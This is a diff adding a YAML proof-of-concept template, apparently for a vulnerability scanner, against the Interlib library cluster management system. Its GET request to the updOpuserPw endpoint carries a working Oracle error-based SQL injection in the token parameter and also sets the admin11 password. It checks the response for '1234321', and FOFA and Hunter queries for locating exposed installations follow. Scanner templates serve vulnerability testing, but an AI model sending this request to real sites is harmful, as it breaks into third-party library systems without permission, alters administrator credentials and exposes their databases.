@@ -1,0 +1,16 @@
+name: interlib-sqli       
+rules: 
+  - method: GET   
+    path: /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%201111*1111%20from%20dual))=%272
+    headers:
+    body:            
+    expression:                        
+      status_code:                
+      response_header:              
+      response_body: "1234321"               #1111*1111结果
+
+detail:                          
+  description: "图书馆集群管理系统Interlib是新一代的图书馆自动化系统,采用开放的多层结构体系,基于Internet实现传统业务管理与海量数字资源管理的结合。图创图书馆集群管理系统 updOpuserPw接口存在SQL注入漏洞截至到2024.5.28有部分网站存在该漏洞"
+  search:             
+    fofa: body="interlib"
+    鹰图: web.body="interlib"
